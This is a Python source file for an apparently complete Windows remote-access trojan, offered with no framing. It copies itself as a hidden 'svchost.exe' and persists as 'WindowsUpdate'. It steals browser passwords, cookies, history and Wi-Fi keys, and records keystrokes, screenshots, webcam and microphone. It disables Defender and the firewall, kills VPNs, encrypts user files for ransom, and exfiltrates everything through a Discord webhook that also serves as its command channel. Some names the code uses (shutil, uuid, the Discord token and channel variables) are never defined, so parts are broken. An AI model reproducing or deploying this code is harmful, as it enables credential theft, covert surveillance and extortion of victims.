import os
import sys
import json
import time
import ctypes
import random
import base64
import socket
import struct
import sqlite3
import platform
import threading
import subprocess
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2

try:
    import requests
    import psutil
    import pynput
    from pynput import keyboard
    import win32gui
    import win32process
    import win32con
    import win32api
    import win32crypt
    from Crypto.Cipher import AES
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", "requests", "psutil", "pynput", "pywin32", "pycryptodome"])
    import requests
    import psutil
    import pynput
    from pynput import keyboard
    import win32gui
    import win32process
    import win32con
    import win32api
    import win32crypt
    from Crypto.Cipher import AES

DISCORD_WEBHOOK = "YOUR_WEBHOOK_HERE"
ENCRYPTION_KEY = Fernet.generate_key()
cipher = Fernet(ENCRYPTION_KEY)
def setbye():
    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        
        if getattr(sys, 'frozen', False):
            file_path = sys.executable
        else:
            file_path = os.path.abspath(__file__)
            
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "WindowsUpdate", 0, winreg.REG_SZ, file_path)
        winreg.CloseKey(handle)
        subprocess.run(f'schtasks /create /tn "WindowsUpdate" /tr "{file_path}" /sc onlogon /f', shell=True)
        
        return "[+] Persistence installed - runs at startup"
    except Exception as e:
        return f"[-] Persistence failed: {e}"
class byebye:
    def __init__(self):
        self.stealth_mode()
        self.system_info = self.gather_system_info()
        self.keylog_data = ""
        self.clipboard_history = []
        self.screenshot_interval = 300
        self.commands = {
            "cmd": self.exec_cmd,
            "upload": self.upload_file,
            "download": self.download_file,
            "screenshot": self.take_screenshot,
            "webcam": self.capture_webcam,
            "keylog": self.start_keylogger,
            "clipboard": self.get_clipboard,
            "processes": self.list_processes,
            "kill": self.kill_process,
            "persist": self.install_persistence,
            "selfdestruct": self.self_destruct,
            "encrypt": self.encrypt_files,
            "decrypt": self.decrypt_files,
            "geolocate": self.get_geolocation,
            "mic": self.record_mic,
            "passwords": self.steal_all_passwords,
            "cookies": self.steal_cookies,
            "history": self.steal_browser_history,
            "wifi": self.steal_wifi_passwords,
            "vpn": self.kill_vpn,
            "disableav": self.disable_av
        }
        
    def stealth_mode(self):
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = __file__
            
        new_path = os.path.join(os.environ.get('APPDATA', ''), 'svchost.exe')
        if exe_path != new_path and not os.path.exists(new_path):
            shutil.copy2(exe_path, new_path)
            os.startfile(new_path)
            sys.exit(0)
            
        ctypes.windll.kernel32.SetFileAttributesW(new_path, 2)
        
    def gather_system_info(self):
        info = {
            "computer": platform.node(),
            "user": os.getlogin(),
            "os": platform.platform(),
            "arch": platform.machine(),
            "cpu": platform.processor(),
            "ram": str(round(psutil.virtual_memory().total / (1024**3))) + "GB",
            "gpu": self.get_gpu_info(),
            "public_ip": self.get_public_ip(),
            "private_ip": socket.gethostbyname(socket.gethostname()),
            "mac": ':'.join(hex(uuid.getnode())[2:].zfill(12)[i:i+2] for i in range(0, 12, 2)),
            "antivirus": self.detect_antivirus(),
            "virtual_machine": self.detect_vm(),
            "timestamp": datetime.now().isoformat()
        }
        return info
        
    def get_gpu_info(self):
        try:
            import GPUtil
            gpus = GPUtil.getGPUs()
            return [gpu.name for gpu in gpus]
        except:
            return ["Unknown"]
            
    def get_public_ip(self):
        services = ["https://api.ipify.org", "https://icanhazip.com", "https://ifconfig.me/ip"]
        for service in services:
            try:
                return requests.get(service, timeout=5).text.strip()
            except:
                continue
        return "Unknown"
        
    def detect_antivirus(self):
        av_products = []
        av_paths = [
            "C:\\Program Files\\Windows Defender",
            "C:\\Program Files\\Avast",
            "C:\\Program Files\\AVG",
            "C:\\Program Files\\Avira",
            "C:\\Program Files\\Bitdefender",
            "C:\\Program Files\\Malwarebytes",
            "C:\\Program Files\\Norton",
            "C:\\Program Files\\Kaspersky Lab",
            "C:\\Program Files\\McAfee",
            "C:\\Program Files\\ESET",
            "C:\\Program Files\\Sophos",
            "C:\\Program Files\\Trend Micro"
        ]
        for path in av_paths:
            if os.path.exists(path):
                av_products.append(os.path.basename(path))
        return av_products if av_products else ["None detected"]
        
    def detect_vm(self):
        vm_indicators = [
            "vbox", "vmware", "qemu", "virtual", "hyper-v",
            "VBoxGuest", "VBoxMouse", "VBoxService", "VBoxTray",
            "vmmem", "vmwp", "vmusrvc", "vmacthlp"
        ]
        for proc in psutil.process_iter(['name']):
            if any(indicator.lower() in proc.info['name'].lower() for indicator in vm_indicators):
                return True
        return False
        
    def send_report(self, data, file=None):
        try:
            if file:
                files = {'file': open(file, 'rb')}
                requests.post(DISCORD_WEBHOOK, files=files, data={'content': data[:2000]})
            else:
                for i in range(0, len(data), 2000):
                    requests.post(DISCORD_WEBHOOK, json={'content': data[i:i+2000]})
        except:
            pass
            
    def steal_all_passwords(self):
        passwords = []
        
        browsers = {
            "chrome": os.path.expanduser("~/.config/google-chrome/Default/Login Data"),
            "edge": os.path.expanduser("~/.config/microsoft-edge/Default/Login Data"),
            "opera": os.path.expanduser("~/.config/opera/Login Data"),
            "brave": os.path.expanduser("~/.config/BraveSoftware/Brave-Browser/Default/Login Data"),
            "firefox": os.path.expanduser("~/.mozilla/firefox/*.default/logins.json")
        }
        
        for browser, path in browsers.items():
            try:
                if os.path.exists(path):
                    if browser == "firefox":
                        with open(path, 'r') as f:
                            data = json.load(f)
                            for login in data.get('logins', []):
                                passwords.append({
                                    "browser": browser,
                                    "url": login.get('hostname'),
                                    "username": login.get('encryptedUsername'),
                                    "password": login.get('encryptedPassword')
                                })
                    else:
                        conn = sqlite3.connect(path)
                        cursor = conn.cursor()
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        for row in cursor.fetchall():
                            decrypted = self.decrypt_chrome_password(row[2])
                            if decrypted:
                                passwords.append({
                                    "browser": browser,
                                    "url": row[0],
                                    "username": row[1],
                                    "password": decrypted
                                })
                        conn.close()
            except:
                continue
                
        wifi = self.steal_wifi_passwords()
        return json.dumps({"passwords": passwords, "wifi": wifi}, indent=2)
        
    def decrypt_chrome_password(self, encrypted):
        try:
            return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode()
        except:
            return ""
            
    def steal_wifi_passwords(self):
        profiles = []
        try:
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode()
            for line in data.split('\n'):
                if "All User Profile" in line:
                    ssid = line.split(':')[1].strip()
                    try:
                        details = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', ssid, 'key=clear']).decode()
                        for detail in details.split('\n'):
                            if "Key Content" in detail:
                                password = detail.split(':')[1].strip()
                                profiles.append({"ssid": ssid, "password": password})
                    except:
                        continue
        except:
            pass
        return profiles
        
    def steal_cookies(self):
        cookies = {}
        cookie_paths = [
            os.path.expanduser("~/.config/google-chrome/Default/Cookies"),
            os.path.expanduser("~/.config/microsoft-edge/Default/Cookies")
        ]
        for path in cookie_paths:
            if os.path.exists(path):
                try:
                    conn = sqlite3.connect(path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, value FROM cookies")
                    for row in cursor.fetchall():
                        if row[0] not in cookies:
                            cookies[row[0]] = {}
                        cookies[row[0]][row[1]] = row[2]
                    conn.close()
                except:
                    continue
        return cookies
        
    def steal_browser_history(self):
        history = []
        history_paths = [
            os.path.expanduser("~/.config/google-chrome/Default/History"),
            os.path.expanduser("~/.config/microsoft-edge/Default/History")
        ]
        for path in history_paths:
            if os.path.exists(path):
                try:
                    conn = sqlite3.connect(path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                    history = cursor.fetchall()
                    conn.close()
                except:
                    continue
        return history
        
    def kill_vpn(self):
        vpn_processes = ["openvpn", "nordvpn", "expressvpn", "cyberghost", "protonvpn"]
        for proc in psutil.process_iter(['name']):
            if any(vpn in proc.info['name'].lower() for vpn in vpn_processes):
                try:
                    proc.kill()
                except:
                    pass
        return "VPN processes terminated"
        
    def disable_av(self):
        commands = [
            "netsh advfirewall set allprofiles state off",
            "sc stop WinDefend",
            "sc config WinDefend start= disabled",
            "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
        ]
        for cmd in commands:
            try:
                subprocess.run(cmd, shell=True, capture_output=True)
            except:
                continue
        return "Security features disabled"
        
    def install_persistence(self):
        if platform.system() == "Windows":
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            try:
                handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(handle, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
                winreg.CloseKey(handle)
            except:
                pass
        return "Persistence installed"
        
    def self_destruct(self):
        self.send_report("Initiating self-destruct sequence")
        if platform.system() == "Windows":
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            try:
                handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(handle, "WindowsUpdate")
                winreg.CloseKey(handle)
            except:
                pass
        os.remove(sys.executable)
        sys.exit(0)
        
    def exec_cmd(self, command):
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=60)
            return result.decode('utf-8', errors='ignore')
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return str(e)
            
    def upload_file(self, path):
        try:
            if os.path.exists(path):
                self.send_report(f"Uploading: {path}", file=path)
                return f"File uploaded: {path}"
        except:
            pass
        return "Upload failed"
        
    def download_file(self, url):
        try:
            r = requests.get(url, timeout=30)
            filename = url.split('/')[-1]
            with open(filename, 'wb') as f:
                f.write(r.content)
            return f"Downloaded: {filename}"
        except:
            return "Download failed"
            
    def take_screenshot(self):
        try:
            from PIL import ImageGrab
            screenshot = ImageGrab.grab()
            filename = f"screenshot_{int(time.time())}.png"
            screenshot.save(filename)
            self.send_report("Screenshot captured", file=filename)
            os.remove(filename)
            return "Screenshot sent"
        except:
            return "Screenshot failed"
            
    def capture_webcam(self):
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                filename = f"webcam_{int(time.time())}.jpg"
                cv2.imwrite(filename, frame)
                self.send_report("Webcam capture", file=filename)
                os.remove(filename)
            cap.release()
            return "Webcam capture sent"
        except:
            return "Webcam failed"
            
    def start_keylogger(self):
        def on_press(key):
            try:
                self.keylog_data += str(key.char)
            except:
                self.keylog_data += f" [{str(key)}] "
                
        listener = keyboard.Listener(on_press=on_press)
        listener.daemon = True
        listener.start()
        return "Keylogger started"
        
    def get_clipboard(self):
        try:
            import pyperclip
            return pyperclip.paste()
        except:
            return ""
            
    def list_processes(self):
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            try:
                processes.append(f"{proc.info['pid']}\t{proc.info['name']}\t{proc.info['cpu_percent']}%\t{proc.info['memory_percent']:.1f}%")
            except:
                continue
        return "\n".join(processes[:100])
        
    def kill_process(self, pid):
        try:
            proc = psutil.Process(int(pid))
            proc.kill()
            return f"Process {pid} killed"
        except:
            return f"Failed to kill {pid}"
            
    def get_geolocation(self):
        try:
            r = requests.get("http://ip-api.com/json/", timeout=5)
            data = r.json()
            return f"Location: {data.get('city')}, {data.get('country')}\nISP: {data.get('isp')}\nCoordinates: {data.get('lat')}, {data.get('lon')}"
        except:
            return "Geolocation failed"
            
    def record_mic(self):
        try:
            import sounddevice as sd
            import soundfile as sf
            duration = 10
            fs = 44100
            recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
            sd.wait()
            filename = f"mic_{int(time.time())}.wav"
            sf.write(filename, recording, fs)
            self.send_report("Mic recording", file=filename)
            os.remove(filename)
            return "Mic recording sent"
        except:
            return "Mic recording failed"
            
    def encrypt_files(self, ext=None):
        targets = [os.path.expanduser("~/Documents"), os.path.expanduser("~/Desktop")]
        encrypted_count = 0
        for target in targets:
            for root, dirs, files in os.walk(target):
                for file in files:
                    if ext and not file.endswith(ext):
                        continue
                    try:
                        filepath = os.path.join(root, file)
                        with open(filepath, 'rb') as f:
                            data = f.read()
                        encrypted = cipher.encrypt(data)
                        with open(filepath + ".encrypted", 'wb') as f:
                            f.write(encrypted)
                        os.remove(filepath)
                        encrypted_count += 1
                    except:
                        continue
        return f"Encrypted {encrypted_count} files"
        
    def decrypt_files(self):
        decrypted_count = 0
        for root, dirs, files in os.walk(os.path.expanduser("~")):
            for file in files:
                if file.endswith(".encrypted"):
                    try:
                        filepath = os.path.join(root, file)
                        with open(filepath, 'rb') as f:
                            data = f.read()
                        decrypted = cipher.decrypt(data)
                        newpath = filepath[:-10]
                        with open(newpath, 'wb') as f:
                            f.write(decrypted)
                        os.remove(filepath)
                        decrypted_count += 1
                    except:
                        continue
        return f"Decrypted {decrypted_count} files"
        
    def c2_listener(self):
        while True:
            try:
                r = requests.get(f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages?limit=1", 
                               headers={"Authorization": f"Bot {DISCORD_TOKEN}"})
                if r.status_code == 200 and r.json():
                    msg = r.json()[0]
                    if msg["author"]["id"] != BOT_ID:
                        for cmd_name, cmd_func in self.commands.items():
                            if msg["content"].startswith(f"!{cmd_name}"):
                                args = msg["content"].replace(f"!{cmd_name}", "").strip()
                                result = cmd_func(args)
                                self.send_report(f"Result:\n{result[:1900]}")
            except:
                pass
            time.sleep(3)
            
    def run(self):
        self.send_report(f"New victim connected:\n{json.dumps(self.system_info, indent=2)}")
        
        passwords = self.steal_all_passwords()
        self.send_report(f"Stolen credentials:\n{passwords}")
        
        self.start_keylogger()
        
        self.install_persistence()
        self.disable_av()
        self.kill_vpn()
        
        threading.Thread(target=self.c2_listener, daemon=True).start()
        
        while True:
            time.sleep(self.screenshot_interval)
            self.take_screenshot()
            if self.keylog_data:
                self.send_report(f"Keylog dump:\n{self.keylog_data[-1000:]}")
                self.keylog_data = ""

if __name__ == "__main__":
    setbye()
    SHDW = byebye()
    SHDW.run()
